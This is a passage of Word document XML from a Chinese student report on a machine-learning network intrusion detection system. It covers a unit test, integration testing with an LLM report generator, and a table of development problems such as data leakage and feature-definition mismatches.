        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_rare_class_missing_from_a_bootstrap_still_works():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F572E09">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """构造一个极稀有类，逼某些 bootstrap 抽不到它，验证概率散射不出错。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE2B447">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y = make_data(n=1200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5074FEDC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    y = y.astype(int)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1269BE29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    y[-3:] = y.max() + 1  # 追加 3 个样本的稀有类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55AF0EB2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    model = HybridForest(n_estimators=8, base_rounds=5, base_depth=3, random_state=0).fit(X, y)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234F521D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    proba = model.predict_proba(X)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA01E7B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert proba.shape == (len(X), y.max() + 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509DE318">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert np.allclose(proba.sum(axis=1), 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A584301">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D32E6E1">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.5.6 小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72741737">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本部分交付了可用的界面与可对照的下限。看板的价值不在好看，而在于它把“来源”“判定值”“风险”这三种不同性质的量分开放置，让人一眼能分清哪条告警是模型给的、哪条是规则给的、哪条的数值是概率、哪条是超阈值的倍数。规则引擎的价值不在指标，而在于它提供了一条“不依赖采集口径”的兜底判据，并在小模型全判 BENIGN 的现场扫描流上确实报了警。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F4076B">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>单元测试 59 条不是凑数：其中三条直接钉住了 3.3.1 节里那两处口径错配，任何人改坏包长或标志位的统计方式，测试会立刻红。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4B97A1">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3.6 系统联调与总体验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8F0F6C">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>四部分完成后由组长做端到端联调。链路是：回放脚本按 2 秒 2 条送会话 → 中心鉴权、推理、落库 →非 BENIGN 流升级成告警 → 规则引擎补充印证 → 后台调用大模型生成报告 → 看板展示。联调中出现的问题记在 3.7 节。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D29A145">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>下图是一次完整的接口联调，五个步骤串起来，全部为真实调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321700FF">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="2529205"/>
            <wp:effectExtent l="0" t="0" r="1460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472000" cy="2529430"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E624A5">
      <w:pPr>
        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-12　端到端接口联调：健康检查 → 上报 → 查告警 → 取大模型报告 → 看统计</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02674865">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这次联调里第四步的读数是：DeepSeek 耗时 4 933 ms、正文 1 071 字；第五步统计显示大模型累计调用 69 次、失败 0 次、可用。其中 #65 是规则命中的告警（来源 rule，超阈值 8.49 倍），#64 与 #63 是小模型判定的告警，三种来源在同一张表里靠“来源”列区分，不会混淆。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631AE624">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>联调还做了一次重复性验证：规则基线脚本重跑，准确率 0.6028、macro-F1 0.5795，与文档记录的数值逐位一致；五模型对比脚本重跑，表 3-6 与图 3-3 的输出一致。这两次重跑的意义在于确认“报告里的数字不是一次性的”——换一台机器、换一天，跑出来还是这些数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD0BE5E">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>看板在浏览器里的实际使用也做了验收：实时页的折线随回放刷新，告警表每 5 秒出现新行，选中一条告警后报告页在 10 秒内出结果，追问的回答在整块重渲后仍在（存在 session_state 里）。这一组验收用的是真实操作截图（图 3-7 至图 3-9），不是示意图。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF44BE0">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3.7 遇到的问题与解决</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0C9B8E">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>开发过程中影响较大的问题列在下表。挑选标准是“曾经让判据变绿但结论是错的”，纯粹的环境配置问题不在此列。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2375096A">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-12　开发中的主要问题与处理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3061"/>
        <w:gridCol w:w="2835"/>
      </w:tblGrid>
      <w:tr w14:paraId="3F418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35" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="283905AD">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>现象</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3B990A98">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>根因</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="425F2595">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>处理</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="07A5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65477DC6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>四个模型在 0.999 附近并列，XGBoost 与单棵决策树只差 0.0002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="51C14E0C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>CIC-IDS2017 随机划分把同一天的近似重复流同时分进训练与测试</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3E1ACADB">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>改用类内按时间划分，并对 9.7% 的完全重复行去重；0.999 不作为结论</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="2EFD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210C5EA8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>验证集上 random_forest 与 xgboost 并列，测试集上差 0.0243</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4F74BC77">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>单段验证集紧贴训练段尾部，测不出再往后滑一段会不会失手</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0F59B4BA">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>改为前向滚动验证（3 折 expanding window），最后 10% 全程封存</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="67A7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35" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="171C9C16">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>线上提取的向量与训练分布对不上，单包流包长被记成 40</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="42B39D99">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>包长类列在数据集里是 L4 载荷字节，我们按 IP 总长统计</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2274F6BE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>按数据集口径改为只统计 L4 载荷，并补一条回归测试钉住</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="46D30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77F25DA3">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>200 包洪流的 Fwd PSH Flags 为 200，相对全表 z≈1006</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="58D6946E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>数据集的标志位列是 0/1 指示量（是否出现过），不是次数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1EB2D21C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>改为 0/1，并补一条回归测试钉住</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="0607B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43203B60">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Heartbleed 类在测试集里 0 行，等于被抹掉</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6160058C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>全量里 Heartbleed 只有 11 行，按比例抽样后只剩 1 行</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="26D39BEE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>改按类配额抽样、稀有类全收；同时说明这抬高了类别先验</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="40AA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384261FA">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>演示时一分钟内产生 21 条 PortScan 误报，触发 21 次大模型调用</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3ED344BE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>数据集的 BENIGN 行里约 48% 是单包短流，会命中 portscan_short 规则（该规则精确率仅 0.468）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="71ACB4CF">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>回放脚本在本地先用 flow_rules() 预筛 BENIGN 行（保留 400、跳过 365），并删除这 21 条误告警与报告</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="6BF1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35" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6D744760">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>服务起不来 / 报告全部退化为模板版</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="49F36C32">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>本机 ALL_PROXY 与 all_proxy 均为 socks://，httpx 只认 socks5://，构造 Client 时即抛异常</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="60BE95BA">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
